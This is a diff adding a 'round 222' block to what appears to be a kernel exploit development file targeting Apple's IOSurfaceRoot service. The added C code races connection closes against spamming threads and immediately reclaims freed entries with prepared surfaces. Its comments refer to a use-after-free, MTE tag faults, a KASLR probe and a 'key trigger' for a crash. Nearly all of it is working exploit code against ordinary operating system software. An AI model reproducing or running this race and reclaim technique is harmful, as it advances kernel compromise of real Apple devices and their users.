@@ -20194,7 +20194,7 @@ new_modes:
          */
         if (rounds >= 170 && rounds != 219) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
-            if (rounds == 220 || rounds == 221) goto r220_block;
+            if (rounds == 220 || rounds == 221 || rounds == 222) goto r220_block;
 
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
                 dispatch_get_global_queue(0, 0), ^{
@@ -26530,6 +26530,187 @@ new_modes:
              * This avoids MTE tag faults because the reclaim allocates a fresh
              * entry with valid MTE tags.
              */
+            if (rounds == 222) {
+                rlog("\n=== r=222: Cumulative race + interleaved reclaim ===\n");
+                rlog("  Replicating r=219 crash pattern with concurrent reclaim\n");
+
+                io_service_t svc222 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!svc222) { rlog("  NO IOSurfaceRoot!\n"); goto phase17_done; }
+
+                CFMutableDictionaryRef sp222 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w222 = 64, h222 = 64, bpe222 = 4, bpr222 = w222 * bpe222;
+                CFNumberRef wn222 = CFNumberCreate(NULL, kCFNumberIntType, &w222);
+                CFNumberRef hn222 = CFNumberCreate(NULL, kCFNumberIntType, &h222);
+                CFNumberRef bn222 = CFNumberCreate(NULL, kCFNumberIntType, &bpe222);
+                CFNumberRef rn222 = CFNumberCreate(NULL, kCFNumberIntType, &bpr222);
+                int pf222 = 0x42475241;
+                CFNumberRef pfn222 = CFNumberCreate(NULL, kCFNumberIntType, &pf222);
+                CFDictionarySetValue(sp222, CFSTR("IOSurfaceWidth"), wn222);
+                CFDictionarySetValue(sp222, CFSTR("IOSurfaceHeight"), hn222);
+                CFDictionarySetValue(sp222, CFSTR("IOSurfaceBytesPerElement"), bn222);
+                CFDictionarySetValue(sp222, CFSTR("IOSurfaceBytesPerRow"), rn222);
+                CFDictionarySetValue(sp222, CFSTR("IOSurfacePixelFormat"), pfn222);
+
+                /* Pre-allocate reclaim pool: 256 connections + surfaces */
+                #define R222_POOL 256
+                io_connect_t rpool[R222_POOL];
+                IOSurfaceRef rsurfs[R222_POOL];
+                int rpool_ok = 0;
+                for (int i = 0; i < R222_POOL; i++) {
+                    rsurfs[i] = IOSurfaceCreate(sp222);
+                    if (!rsurfs[i]) { rpool[i] = IO_OBJECT_NULL; continue; }
+                    if (IOServiceOpen(svc222, mach_task_self(), 0, &rpool[i]) == KERN_SUCCESS) {
+                        rpool_ok++;
+                    } else rpool[i] = IO_OBJECT_NULL;
+                }
+                rlog("  Reclaim pool: %d/%d ready\n", rpool_ok, R222_POOL);
+                int ridx = 0;
+
+                /* Start render loop */
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r222_rt;
+                pthread_create(&r222_rt, NULL, p13_render_loop, NULL);
+                usleep(100000);
+                rlog("  Render loop: frames=%d\n", p13_render_frames);
+
+                uint64_t inp222[3] = {1, 2, 3};
+
+                /* === Phase 1: v_race8 x3 (cumulative, like r=219) === */
+                for (int vr = 0; vr < 3; vr++) {
+                    io_connect_t vcs[8]; int vhave[8];
+                    for (int i = 0; i < 8; i++) {
+                        vhave[i] = (IOServiceOpen(svc222, mach_task_self(), 0, &vcs[i]) == KERN_SUCCESS);
+                        if (vhave[i]) {
+                            mach_port_t twp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                            mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xDEAD222000000000ULL | (vr << 8);
+                            IOConnectCallAsyncMethod(vcs[i], 17, twp, &ref, 1,
+                                NULL, 0, inp222, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), twp);
+                        } else vcs[i] = IO_OBJECT_NULL;
+                    }
+
+                    /* Start spam on conn[0] */
+                    p13_spam_run = 1;
+                    p13_spam_conn = vhave[0] ? vcs[0] : IO_OBJECT_NULL;
+                    p13_spam_shape = 0;
+                    p13_spam_count = 0;
+                    pthread_t vspam[8];
+                    for (int t = 0; t < 8; t++)
+                        pthread_create(&vspam[t], NULL, p13_spam_reg, NULL);
+
+                    /* Stagger close with INTERLEAVED reclaim */
+                    for (int r = 0; r < 3; r++)
+                        for (int i = 0; i < 8; i++) {
+                            int j = (i * 5 + r * 3) % 8;
+                            if (vhave[j]) {
+                                IOServiceClose(vcs[j]); vhave[j] = 0;
+                                /* Immediately reclaim */
+                                if (ridx < R222_POOL && rpool[ridx] && rsurfs[ridx]) {
+                                    mach_port_t twp = MACH_PORT_NULL;
+                                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                                    mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                                    uint64_t ref = 0xEE00222000000000ULL | ridx;
+                                    uint64_t ri[3];
+                                    ri[0] = IOSurfaceGetID(rsurfs[ridx]);
+                                    ri[1] = 0xCC22000000000000ULL | ridx;
+                                    ri[2] = 0;
+                                    IOConnectCallAsyncMethod(rpool[ridx], 17, twp, &ref, 1,
+                                        NULL, 0, ri, 24, NULL, NULL, NULL, NULL);
+                                    mach_port_deallocate(mach_task_self(), twp);
+                                    ridx++;
+                                }
+                            }
+                            usleep(20 + vr * 10);
+                        }
+
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 8; t++) pthread_join(vspam[t], NULL);
+                    for (int i = 0; i < 8; i++) if (vhave[i]) IOServiceClose(vcs[i]);
+                    rlog("  v_race8[%d] spam=%llu reclaim_idx=%d frames=%d\n",
+                        vr, (unsigned long long)p13_spam_count, ridx, p13_render_frames);
+                }
+
+                /* === Phase 2: v_big x2 (cumulative, with surface churn) === */
+                for (int vb = 0; vb < 2; vb++) {
+                    IOSurfaceRef bigs[64];
+                    for (int i = 0; i < 64; i++) bigs[i] = IOSurfaceCreate(sp222);
+
+                    io_connect_t bcs[8]; int bhave[8];
+                    for (int i = 0; i < 8; i++) {
+                        bhave[i] = (IOServiceOpen(svc222, mach_task_self(), 0, &bcs[i]) == KERN_SUCCESS);
+                        if (bhave[i]) {
+                            mach_port_t twp = MACH_PORT_NULL;
+                            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                            mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                            uint64_t ref = 0xBBBB222000000000ULL | (vb << 8);
+                            IOConnectCallAsyncMethod(bcs[i], 17, twp, &ref, 1,
+                                NULL, 0, inp222, 24, NULL, NULL, NULL, NULL);
+                            mach_port_deallocate(mach_task_self(), twp);
+                        } else bcs[i] = IO_OBJECT_NULL;
+                    }
+                    p13_spam_run = 1;
+                    p13_spam_conn = bhave[0] ? bcs[0] : IO_OBJECT_NULL;
+                    p13_spam_count = 0;
+                    pthread_t bspam[6];
+                    for (int t = 0; t < 6; t++)
+                        pthread_create(&bspam[t], NULL, p13_spam_reg, NULL);
+
+                    /* Reverse stagger close with interleaved reclaim */
+                    for (int i = 7; i >= 0; i--) {
+                        if (bhave[i]) {
+                            IOServiceClose(bcs[i]); bhave[i] = 0;
+                            if (ridx < R222_POOL && rpool[ridx] && rsurfs[ridx]) {
+                                mach_port_t twp = MACH_PORT_NULL;
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &twp);
+                                mach_port_insert_right(mach_task_self(), twp, twp, MACH_MSG_TYPE_MAKE_SEND);
+                                uint64_t ref = 0xEE01222100000000ULL | ridx;
+                                uint64_t ri[3];
+                                ri[0] = IOSurfaceGetID(rsurfs[ridx]);
+                                ri[1] = 0xDD22000000000000ULL | ridx;
+                                ri[2] = 0;
+                                IOConnectCallAsyncMethod(rpool[ridx], 17, twp, &ref, 1,
+                                    NULL, 0, ri, 24, NULL, NULL, NULL, NULL);
+                                mach_port_deallocate(mach_task_self(), twp);
+                                ridx++;
+                            }
+                        }
+                        usleep(30);
+                    }
+
+                    /* Release big surfaces while spam runs (this is the key trigger) */
+                    for (int i = 0; i < 64; i++) if (bigs[i]) { CFRelease(bigs[i]); bigs[i] = NULL; }
+
+                    p13_spam_run = 0;
+                    for (int t = 0; t < 6; t++) pthread_join(bspam[t], NULL);
+                    for (int i = 0; i < 8; i++) if (bhave[i]) IOServiceClose(bcs[i]);
+                    rlog("  v_big[%d] spam=%llu reclaim_idx=%d frames=%d\n",
+                        vb, (unsigned long long)p13_spam_count, ridx, p13_render_frames);
+                }
+
+                /* Wait for compositor to process a few more frames */
+                usleep(200000);
+                rlog("  POST-RACE: survived! reclaim_used=%d frames=%d\n", ridx, p13_render_frames);
+
+                /* Cleanup */
+                p13_render_run = 0;
+                pthread_join(r222_rt, NULL);
+
+                for (int i = 0; i < R222_POOL; i++) {
+                    if (rpool[i]) IOServiceClose(rpool[i]);
+                    if (rsurfs[i]) CFRelease(rsurfs[i]);
+                }
+                CFRelease(wn222); CFRelease(hn222); CFRelease(bn222); CFRelease(rn222); CFRelease(pfn222);
+                CFRelease(sp222);
+                IOObjectRelease(svc222);
+                rlog("=== r=222 complete ===\n");
+                goto phase17_done;
+            }
+
             if (rounds == 221) {
                 rlog("\n=== r=221: UAF verification — selective reclaim skip ===\n");
 
